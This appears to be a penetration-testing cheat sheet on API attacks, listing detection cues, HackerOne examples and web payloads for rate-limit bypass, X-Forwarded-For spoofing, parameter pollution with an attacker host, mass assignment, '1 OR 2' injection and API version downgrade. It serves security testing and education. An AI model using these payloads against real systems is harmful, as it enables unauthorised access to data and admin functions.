---
tags:
  - critical
  - server-side
---

# API Security Attacks

## TL;DR

API-specific attacks target rate limiting, mass assignment, hidden endpoints, and version mismatches.

**Key vectors:**
- Newline characters for rate limit bypass
- HPP for validation bypass
- X-Forwarded-For spoofing for internal access

## Detection

### Identify API Endpoints

```
/api/, /v1/, /v2/, /graphql
/swagger.json, /openapi.json
/status, /health, /metrics, /debug
```

### Rate Limiting Indicators

- `429 Too Many Requests` responses
- `X-RateLimit-*` headers
- Consistent blocking after N requests

### Mass Assignment Indicators

- JSON bodies accepting arbitrary fields
- User role/privilege fields in responses
- Object creation with nested objects

## Exploitation

### Rate Limiting Bypasses

**Newline Character Bypass:**
```
Original: email=user@domain.com
Bypass:   email=user@domain.com\n
```

**X-Forwarded-For Spoofing:**
```http
GET /api/admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
```

**HTTP Parameter Pollution (HPP):**
```
Normal:  host=https://attacker.com (blocked)
Bypass:  host=https://legit.com&host=https://attacker.com
```

### Mass Assignment

**Logical Operator Injection:**
```json
{
  "order_lookup": {
    "email": "target@domain.com", 
    "order_number": "1 OR 2"
  }
}
```

**Array Expansion:**
```
role=user → role[]=user&role[]=admin
```

**Object Injection:**
```json
{
  "username": "user123",
  "role": "admin",
  "is_verified": true
}
```

### Hidden Endpoint Discovery

**Internal IP Access:**
```http
GET /status HTTP/1.1
X-Forwarded-For: 127.0.0.1
```

**Admin API Enumeration:**
```
/api/usermgmnt/pendingUserDetails/{id}
/api/usermgmnt/getAttachmentBytes/{id}
```

### Version Downgrade

```
/api/v3/users/profile    (secure)
/api/v2/users/profile    (legacy)
/api/v1/users/profile    (no auth)

# Path injection
/api/v2/../v1/sensitive-endpoint
```

## Bypasses

### Rate Limit Characters

```
\n, \r, \t, \0, %00, %0A, %0D, %09
%20, +, %C2%A0 (non-breaking space)
%E2%80%82, %E2%80%83, %E2%80%89 (Unicode)
```

### Bypass Headers

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Forwarded-Host: internal-service.local
```

## Real Examples

- **HackerOne #1040471 (Khan Academy):** Newline `\n` bypasses rate limiting
- **HackerOne #1011767 (Yelp):** X-Forwarded-For unlocks internal APIs
- **HackerOne #114169 (Twitter Digits):** HPP bypass on OAuth host validation
- **HackerOne #1017576 (Shopify):** `1 OR 2` syntax for order data access
- **HackerOne #1061292 (GSA TAMS):** Unauthenticated admin API access

## Fuzzing Targets

```
# Parameters
role, admin, is_admin, user_type, privilege
status, active, enabled, verified, confirmed
version, api_version, host, redirect_uri

# Endpoints
/api/v*/admin/*
/api/*/management/*
/swagger.json, /openapi.json
/status, /health, /metrics, /debug
```
